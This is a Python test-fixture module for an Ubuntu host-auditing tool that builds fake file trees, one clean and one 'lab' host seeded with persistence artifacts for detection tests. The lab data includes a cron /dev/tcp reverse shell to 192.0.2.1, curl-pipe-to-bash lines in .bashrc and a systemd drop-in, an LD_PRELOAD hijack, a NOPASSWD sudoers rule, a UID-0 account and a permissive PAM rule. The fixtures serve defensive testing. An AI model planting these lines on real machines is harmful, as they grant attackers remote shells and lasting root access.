"""Fixture hosts: small file trees that stand in for an Ubuntu host.

Each host is built into a directory and scanned with
``LiveSource(root=..., offline=True)`` (what ``ubuntils analyze --root`` does),
so tests never touch the machine running them. Every file gets a fixed age so
recency rules give the same answer on every run; ``recent`` paths are stamped
"now" instead. Golden outputs, the C1–C9 review regressions and the
scan/analyze parity test all build on these.
"""
from __future__ import annotations

import os
import time

OLD_DAYS = 400

STOCK_PASSWD = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
admin:x:1000:1000:Admin:/home/admin:/bin/bash
"""
STOCK_SHADOW = """root:*:19000:0:99999:7:::
daemon:*:19000:0:99999:7:::
www-data:*:19000:0:99999:7:::
nobody:*:19000:0:99999:7:::
admin:$6$salt$hash:19000:0:99999:7:::
"""
STOCK_GROUP = """root:x:0:
sudo:x:27:admin
docker:x:998:
www-data:x:33:
admin:x:1000:
"""
STOCK_SUDOERS = """Defaults env_reset
root ALL=(ALL:ALL) ALL
%sudo ALL=(ALL:ALL) ALL
@includedir /etc/sudoers.d
"""
STOCK_CRONTAB = """SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
17 * * * * root cd / && run-parts --report /etc/cron.hourly
"""
STOCK_BASHRC = "# ~/.bashrc\n[ -z \"$PS1\" ] && return\nalias ll='ls -alF'\n"
ADMIN_KEY = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7Ue8bQnB6m8bPqfV1oQ3n0lJ3m1cGx7Zt0d6s2YqkA "
             "admin@laptop")
OTHER_KEY = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEm5nU3cQd1bG3Yt0xR4lQv8m2YQpZ5bZ0n9k1s3T6sB "
             "deploy@ci")

CLEAN = {
    "/etc/os-release": 'NAME="Ubuntu"\nVERSION_ID="24.04"\nPRETTY_NAME="Ubuntu 24.04.3 LTS"\nID=ubuntu\n',
    "/etc/hostname": "fixture\n",
    "/etc/timezone": "Etc/UTC\n",
    "/etc/passwd": STOCK_PASSWD,
    "/etc/shadow": STOCK_SHADOW,
    "/etc/group": STOCK_GROUP,
    "/etc/sudoers": STOCK_SUDOERS,
    "/etc/crontab": STOCK_CRONTAB,
    "/etc/environment": 'PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\n',
    "/etc/bash.bashrc": "# System-wide .bashrc\n[ -z \"$PS1\" ] && return\n",
    "/etc/profile": "# /etc/profile\nif [ -d /etc/profile.d ]; then :; fi\n",
    "/etc/nsswitch.conf": "passwd: files systemd\ngroup: files systemd\nhosts: files dns\n",
    "/etc/pam.d/common-auth": ("auth [success=1 default=ignore] pam_unix.so nullok\n"
                               "auth requisite pam_deny.so\nauth required pam_permit.so\n"),
    "/etc/ssh/sshd_config": "PermitRootLogin prohibit-password\n",
    "/home/admin/.bashrc": STOCK_BASHRC,
    "/home/admin/.ssh/authorized_keys": ADMIN_KEY + "\n",
    "/lib/systemd/system/cron.service": "[Service]\nExecStart=/usr/sbin/cron -f\n",
}

# The file-based artifacts of tools/lab/seed-lab.sh (the ones an offline
# --root analysis can see; processes, setuid search, lsattr, dpkg and kernel
# modules need a live host).
LAB = dict(CLEAN)
LAB.update({
    "/etc/passwd": STOCK_PASSWD
    + "ubuntils-lab:x:1001:1001::/home/ubuntils-lab:/bin/bash\n"
    + "ubuntils-lab-root:x:0:0::/root:/usr/sbin/nologin\n",
    "/etc/shadow": STOCK_SHADOW + "ubuntils-lab:!:19000::::::\nubuntils-lab-root:!:19000::::::\n",
    "/etc/cron.d/ubuntils-lab": "0 0 31 2 * root /tmp/ubuntils-lab/beacon\n",
    "/etc/cron.d/ubuntils-lab-revshell":
        "0 0 31 2 * root bash -c 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'\n",
    "/var/spool/cron/crontabs/ubuntils-lab": "0 0 31 2 * sudo /usr/bin/true ubuntils-lab\n",
    "/etc/sudoers.d/ubuntils-lab": "ubuntils-lab ALL=(ALL) NOPASSWD: ALL\n",
    "/home/ubuntils-lab/.ssh/authorized_keys": 'command="/bin/true" ' + OTHER_KEY + "\n",
    "/home/ubuntils-lab/.ssh/authorized_keys2": OTHER_KEY.replace("deploy@ci", "lab@k2") + "\n",
    "/home/ubuntils-lab/.bashrc": STOCK_BASHRC
    + "curl -fsSL http://ubuntils-lab.invalid/x | bash\n"
    + "export LD_PRELOAD=/tmp/ubuntils-lab/libx.so\n",
    "/etc/systemd/system/ubuntils-lab-updater.service":
        "[Service]\nExecStart=/tmp/ubuntils-lab/updater\n",
    "/etc/systemd/system/cron.service.d/ubuntils-lab.conf":
        "[Service]\nExecStart=\nExecStart=/bin/sh -c 'curl -s http://ubuntils-lab.invalid | bash'\n",
    "/etc/pam.d/ubuntils-lab": "auth sufficient pam_permit.so\n",
})

HOSTS = {"clean": CLEAN, "lab": LAB}


def build(root, files: dict, now: float | None = None, recent=(), old_days: int = OLD_DAYS):
    """Write ``files`` (absolute path → content) under ``root``.

    Every file and directory is stamped ``old_days`` ago, except paths in
    ``recent`` (stamped ``now``). Returns ``root`` as a string.
    """
    now = time.time() if now is None else now
    old = now - old_days * 86400
    root = str(root)
    for path, content in files.items():
        dest = os.path.join(root, path.lstrip("/"))
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        with open(dest, "w") as fh:
            fh.write(content)
    for dirpath, dirnames, filenames in os.walk(root, topdown=False):
        for name in filenames + dirnames:
            os.utime(os.path.join(dirpath, name), (old, old))
    for path in recent:
        os.utime(os.path.join(root, path.lstrip("/")), (now, now))
    return root


def build_host(name: str, root, **kwargs) -> str:
    return build(root, HOSTS[name], **kwargs)


def fixture_source(root, live_commands: dict | None = None):
    """An offline source over ``root`` whose ctimes equal the mtimes.

    A real filesystem can't backdate ctime, so without this every fixture file
    would look changed "now". ``live_commands`` maps a command name to
    ``(stdout, rc)`` for tests that need command-based collectors.
    """
    from ubuntils.collectors.source import LiveSource

    class FixtureSource(LiveSource):
        def lstat(self, path):
            st = super().lstat(path)
            seq = list(st)
            seq[9] = seq[8]  # st_ctime := st_mtime (int fields)
            # A host's files are root's unless the fixture says otherwise; the
            # files under test are owned by whoever runs the tests.
            owner = _owners(str(root)).get("/" + path.lstrip("/"), (0, 0))
            seq[4], seq[5] = owner
            extra = {"st_ctime": st.st_mtime, "st_ctime_ns": st.st_mtime_ns,
                     "st_mtime": st.st_mtime, "st_mtime_ns": st.st_mtime_ns,
                     "st_atime": st.st_atime, "st_atime_ns": st.st_atime_ns}
            return os.stat_result(seq, extra)

        def run(self, name, argv, timeout=30):
            if live_commands and name in live_commands:
                out, rc = live_commands[name]
                return out, "", rc
            if name == "find_setuid":
                return _emulate_find_setuid(str(root), argv), "", 0
            return super().run(name, argv, timeout=timeout)

    return FixtureSource(root=str(root), offline=True)


def _emulate_find_setuid(root: str, argv: list) -> str:
    """What `find START... -xdev ( -perm -4000 -o -perm -2000 ) -type f
    -printf '%m %p\\n'` prints for the fixture tree: only under the start
    paths the collector actually passes, so a test can't pass by accident."""
    starts = []
    for arg in argv[1:]:
        if arg.startswith("-") or arg == "(":
            break
        starts.append(arg)
    pruned = {argv[i + 1] for i, a in enumerate(argv[:-1]) if a == "-path"}
    import json
    try:
        modes = json.load(open(os.path.join(root, ".fixture-modes.json")))
    except FileNotFoundError:
        modes = {}
    lines = []
    for start in starts:
        base = os.path.join(root, start.lstrip("/"))
        for dirpath, dirs, files in os.walk(base):
            dirs[:] = [d for d in dirs
                       if "/" + os.path.relpath(os.path.join(dirpath, d), root) not in pruned]
            for f in files:
                full = os.path.join(dirpath, f)
                rel = "/" + os.path.relpath(full, root)
                if os.path.islink(full):
                    continue
                # Some filesystems (and sandboxes) silently drop the setuid
                # bit for non-root users, so fixtures declare modes instead.
                mode = modes.get(rel, os.lstat(full).st_mode & 0o7777)
                if mode & 0o6000:
                    lines.append(f"{mode:o} {rel}")
    return "\n".join(sorted(lines)) + ("\n" if lines else "")


def _owners(root: str) -> dict:
    import json
    f = os.path.join(root, ".fixture-owners.json")
    if not os.path.exists(f):
        return {}
    return {k: tuple(v) for k, v in json.load(open(f)).items()}


def set_owner(root, path: str, uid: int, gid: int):
    """Declare ``path``'s owner as the fixture source reports it (default 0:0)."""
    import json
    f = os.path.join(str(root), ".fixture-owners.json")
    owners = json.load(open(f)) if os.path.exists(f) else {}
    owners[path] = [uid, gid]
    json.dump(owners, open(f, "w"))


def set_mode(root, path: str, mode: int):
    """Declare ``path``'s permission bits (e.g. 0o4755) for the find emulation."""
    import json
    f = os.path.join(str(root), ".fixture-modes.json")
    modes = json.load(open(f)) if os.path.exists(f) else {}
    modes[path] = mode
    json.dump(modes, open(f, "w"))


def set_capability(root, path: str, caps: str):
    """Declare a file capability (as `getcap` prints it) for ``path``. Read by
    the fixture source once ubuntils reads capabilities (E8-S8)."""
    import json
    f = os.path.join(str(root), ".fixture-caps.json")
    data = json.load(open(f)) if os.path.exists(f) else {}
    data[path] = caps
    json.dump(data, open(f, "w"))


def add_process(root, pid: int, name: str, exe: str, cmdline: str = "", uid: int = 0):
    """A /proc/<pid> entry: status, comm, cmdline, and exe as a real symlink."""
    d = os.path.join(str(root), "proc", str(pid))
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "status"), "w") as fh:
        fh.write(f"Name:\t{name}\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n")
    with open(os.path.join(d, "comm"), "w") as fh:
        fh.write(name + "\n")
    with open(os.path.join(d, "cmdline"), "w") as fh:
        fh.write((cmdline or exe).replace(" ", "\x00") + "\x00")
    os.symlink(exe, os.path.join(d, "exe"))


def scan(root, live_commands=None):
    """Run the real pipeline over a fixture tree; Wazuh off."""
    from ubuntils.pipeline import run_scan
    return run_scan(fixture_source(root, live_commands), forward_wazuh=False)
